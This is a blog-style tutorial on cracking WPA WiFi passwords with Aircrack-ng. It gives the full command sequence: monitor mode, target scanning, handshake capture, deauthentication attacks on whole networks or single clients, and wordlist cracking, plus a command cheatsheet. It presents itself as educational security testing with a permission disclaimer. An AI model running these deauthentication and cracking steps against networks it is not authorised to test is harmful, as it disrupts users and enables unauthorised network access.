---
title: "Cracking WiFi Passwords with Aircrack-NG"
description: Educational guide to WiFi security testing using the Aircrack-ng suite for monitoring, capturing, and analyzing wireless networks.
date: 2024-07-06T22:06:14+0800
lastmod: 2026-04-13T21:00:50+0800
tag: "WiFi Security, Aircrack-NG"
lang: en-US
---

## What Is Aircrack-ng?

To make a long story short, Aircrack-ng is a network software suite consisting of WiFi security tools that can be used to assess the security of wireless networks. It focuses on different areas of WiFi security, including monitoring, attacking, testing, and cracking.

### Disclaimer

This guide is for educational purposes only. Unauthorized access to wireless networks is illegal and unethical. Always obtain permission from the network owner before attempting to access or test their network security.

Only crack your own network or a network where the owner has given you explicit permission.

## Hardware Requirements

To get started with Aircrack-ng, you'll need a compatible wireless network adapter that supports **monitor mode** and **packet injection**.

Not sure which WiFi adapter to buy? Check out my guide! It covers chipsets, drivers, and where to buy.

>[Stop Buying the Wrong WiFi Adapter !!! The Ultimate 2026 WiFi Pentesting Hardware Guide, Known as Kali, BlackArch Compatible](/posts/infosec/wifi-adapter-guide-2026)

## Installing Aircrack-NG

You'll also need a computer with a GNU/Linux operating system, such as Kali Linux, which comes with Aircrack-ng pre-installed. Alternatively, you can install it yourself:

```bash
sudo pacman -S aircrack-ng
```

> Note: The commands below require root privileges. It's recommended to use `sudo` or switch to the root user.

## Testing Speed

You can run this command to test out how many passwords per second Aircrack can try.

```shell
sudo aircrack-ng -S
```

## Finding Your Wireless Interface

First, identify your wireless interface name:

```bash
ip a
```

Look for your wireless interface. It's usually named something like `wlan0` or `wlo1`, but it may also be randomly generated. Verify it with `ifconfig` or `ip a` to make sure it's correct.

## iwconfig

Check if your wireless card supports monitor mode and recognizes the wireless interface:

```shell
iwconfig
```

You should see something like `Mode:Managed`, which means this is the default "normal" mode for day-to-day internet browsing, allowing the card to send and receive data destined specifically for its MAC address.

## Frequency Checking

Now you can use this command to check the radio frequencies and corresponding channels supported by a specific wireless network interface:

```
iwlist <interface name> frequency
# eg: iwlist wlan0 frequency
```

## Starting Monitor Mode

Enable monitor mode on your wireless interface. This will disable your normal network connection:

```shell
sudo airmon-ng start <interface name>
# eg: sudo airmon-ng start wlan0
```

After enabling monitor mode, your interface will typically be renamed with a `mon` suffix (e.g., `wlan0mon`), but as a best practice, always use the `ip a` command to verify the interface name.

## Testing Packet Injection

To perform Aircrack-ng attacks, you need to verify that your adapter supports packet injection. Start by using this simple command to check.

```shell
sudo aireplay-ng -9 <your-interface-mon>
# eg: sudo aireplay-ng -9 wlan0mon

sudo aireplay-ng --test <your-interface-mon>
# eg: sudo aireplay-ng --test wlan0mon
```

## Finding Target WiFi Network

Identify the WiFi network. You'll need the following information:

- **BSSID** (MAC address of the access point)
- **Channel** number
- **ESSID** (network name)

```shell
sudo airodump-ng <your-interface-mon>
# eg: sudo airodump-ng wlan0mon
```

If you want to refresh and quickly view nearby WiFi networks from NetworkManager, you can also run:

```shell
nmcli device wifi list --rescan yes
```

## Creating Capture File

Capture data from the target network. This network is the WiFi you want to crack the password for.

```shell
sudo airodump-ng -d <BSSID> -c <channel> -w <output> <your-interface-mon>
# e.g. sudo airodump-ng -d 11:22:33:44:55:66 -c 1 -w home wlan0mon
```

After using the `-w` option, it will save a capture file as `<output>-01.cap`. The `.cap` file will be used in the next step for password cracking. You will also need to capture the WiFi handshake.

## Performing Deauthentication Attack - Full Range

This will disconnect clients from the WiFi network, forcing them to reconnect, which allows you to capture the WPA handshake (or PMKID). The handshake is necessary to crack the WiFi password. You can also use the captured handshake with other tools like Hashcat.

Open a **new terminal** and run:

```shell
sudo aireplay-ng --deauth 0 -a <BSSID> <your-interface-mon>
# eg: sudo aireplay-ng --deauth 0 -a 11:22:33:44:55:66 wlan0mon
```

Watch the first terminal. Once you see `WPA handshake: <BSSID>`, you've captured it and can stop both commands.

## Capturing a Handshake from a Specific Device

You can target a specific client device with a deauthentication attack instead of targeting the whole AP. Instead of monitoring all APs, use this command to focus on one AP only.

```shell
sudo airodump-ng -c 1 wlan0mon
```

If that does not work, run these commands. `airodump-ng` can sometimes be unstable, so use whichever command works in your setup.

```shell
sudo iwconfig wlan1mon channel 11
sudo iw dev wlan1mon set channel 11
```

## Performing Deauthentication Attack - Specific Device

This targets one specific device on the network, disconnecting only that client instead of the entire network. Most of the time, this is the better approach, but if you need something quick for a school assignment, using full-range `aireplay-ng` is fine :)

```shell
sudo aireplay-ng -0 10 -a <MAC address of the AP> -c <MAC address of the client device> <interface name>
# eg: sudo aireplay-ng -0 10 -a B2:C1:3D:3B:2B:A1 -c 02:00:00:00:02:00 wlan0mon
```

`-a` is the MAC address (BSSID) of the target WiFi, while `-c` is the client's MAC address.

**Parameters**:
- `-0 10` - Send 10 deauthentication packets
- `-a` - Target AP BSSID
- `-c` - Client MAC address (from STATION column)

## Deauthentication Is Not Always Required

Deauthentication is one way to force a client to reconnect in order to capture the handshake. However, you can also simply wait for a legitimate client to connect (or attempt a failed connection) and capture the handshake naturally.

>***Deauthentication essentially acts as a DoS attack against the AP, but it is not strictly required to crack the AP password.***

## Cracking the Password

Once you've captured the handshake or PMKID, use Aircrack-ng to crack the WiFi password:

```shell
sudo aircrack-ng <capture file> -w <wordlist>
# e.g. sudo aircrack-ng home-01.cap -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-05.txt
# You can use SecLists btw.
```

## Closing Monitor Mode

After you've finished testing the network security, stop the monitor mode on your wireless interface. Your normal network connection will be restored:

```shell
sudo airmon-ng stop <your-interface-mon>
# eg: sudo airmon-ng stop wlan0mon
```

## By the Way

You can keep the `.cap` file, as that's all you need to crack a WiFi password later. You don't need to capture the handshake again. This file can also be shared with others, making the cracking process more flexible and allowing it to be done offline.

## Quick Command Cheatsheet

| Command | Purpose |
|---------|---------|
| `ip a` | Find your wireless interface name |
| `iwconfig` | Check wireless card status |
| `iwlist wlan0 frequency` | List supported frequencies/channels |
| `airmon-ng start wlan0` | Enable monitor mode |
| `aireplay-ng -9 wlan0mon` | Test packet injection |
| `airodump-ng wlan0mon` | Scan nearby networks |
| `airodump-ng -d <BSSID> -c <channel> -w <output> wlan0mon` | Capture target traffic and save `.cap` |
| `airodump-ng -c 1 wlan0mon` | Focus capture on one AP/channel |
| `aireplay-ng --deauth 0 -a <BSSID> wlan0mon` | Deauth all clients on target AP |
| `aireplay-ng -0 10 -a <AP BSSID> -c <client MAC> wlan0mon` | Deauth one specific client |
| `aircrack-ng <capture file> -w <wordlist>` | Crack captured handshake/PMKID |
| `airmon-ng stop wlan0mon` | Disable monitor mode |
